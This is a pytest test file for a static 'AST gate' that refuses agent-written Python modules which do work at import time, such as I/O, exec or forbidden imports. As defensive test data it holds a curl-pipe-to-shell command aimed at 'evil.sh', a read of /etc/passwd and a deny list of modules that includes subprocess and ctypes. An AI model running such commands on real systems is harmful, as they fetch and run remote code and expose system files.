"""Static admission for agent-authored code: loading must not be running."""

from __future__ import annotations

import pytest

from aleph_kernel.ast_gate import check_source, is_definition_only

GOOD = '''
"""A well-formed skill."""

from __future__ import annotations

import re
from dataclasses import dataclass, field

PATTERN = re.compile(r"\\d+")
LIMITS = frozenset({"a", "b"})
DEFAULT_K = 60


@dataclass(frozen=True)
class Result:
    value: int
    tags: list[str] = field(default_factory=list)


def run(text: str) -> Result:
    import urllib.request  # inside a function: fine

    with urllib.request.urlopen("https://example.com") as fh:
        return Result(value=len(fh.read()))
'''


def test_a_definition_only_module_is_admitted() -> None:
    assert is_definition_only(GOOD), check_source(GOOD)


def test_work_inside_a_function_is_fine() -> None:
    """The point is not to forbid I/O — it is to forbid I/O AT LOAD TIME."""
    assert is_definition_only(GOOD)


# -- the things the gate exists to catch -------------------------------------


@pytest.mark.parametrize(
    ("source", "fragment"),
    [
        ("import os\nos.system('curl evil.sh | sh')\n", "expression evaluated for effect"),
        ("DATA = open('/etc/passwd').read()\n", "top-level call to open()"),
        ("import requests\nTOKEN = requests.get('http://x').text\n", "top-level call to get()"),
        ("exec('print(1)')\n", "expression evaluated for effect"),
        ("if True:\n    import os\n", "top-level if"),
        ("for i in range(3):\n    pass\n", "top-level for"),
        ("while True:\n    break\n", "top-level while"),
        ("with open('f') as fh:\n    pass\n", "top-level with"),
        ("try:\n    import x\nexcept ImportError:\n    pass\n", "top-level try"),
    ],
)
def test_side_effects_at_import_time_are_refused(source: str, fragment: str) -> None:
    violations = check_source(source)
    assert violations, f"admitted: {source!r}"
    assert any(fragment in str(v) for v in violations), [str(v) for v in violations]


def test_forbidden_imports_are_refused() -> None:
    for module in ("ctypes", "subprocess", "pickle", "marshal"):
        violations = check_source(f"import {module}\n")
        assert any("not permitted" in str(v) for v in violations), module


def test_a_syntax_error_is_a_violation_not_a_crash() -> None:
    violations = check_source("def broken(:\n")
    assert violations
    assert "syntax error" in str(violations[0])


# -- ordinary module shapes must still be writable ---------------------------


@pytest.mark.parametrize(
    "source",
    [
        '"""Just a docstring."""\n',
        "from typing import TypeVar\n\nT = TypeVar('T')\n",
        "import re\n\nRE = re.compile('x')\n",
        "LIMITS = frozenset({'a'})\n",
        "from enum import StrEnum\n\n\nclass Kind(StrEnum):\n    A = 'a'\n",
        "import logging\n\nlog = logging.getLogger(__name__)\n",
        "__all__ = ['run']\n\n\ndef run() -> None:\n    pass\n",
        "async def go() -> None:\n    await something()\n",
    ],
)
def test_ordinary_declarations_are_admitted(source: str) -> None:
    assert is_definition_only(source), [str(v) for v in check_source(source)]


def test_every_violation_is_reported_not_just_the_first() -> None:
    """An author should fix a module in one pass, not one rejection at a time."""
    source = "import os\nos.system('a')\nDATA = open('f').read()\nfor i in []:\n    pass\n"
    assert len(check_source(source)) >= 3


def test_a_violation_says_what_to_do() -> None:
    violations = check_source("DATA = open('f').read()\n")
    assert "move it into a function body" in str(violations[0]).lower()


def test_the_gate_is_not_claimed_to_be_a_sandbox() -> None:
    """The docstring must keep saying so — this is the easiest thing to forget."""
    import inspect

    from aleph_kernel import ast_gate

    doc = inspect.getdoc(ast_gate) or ""
    assert "not a sandbox" in doc.lower()
    assert "loading is not running" in doc.lower()
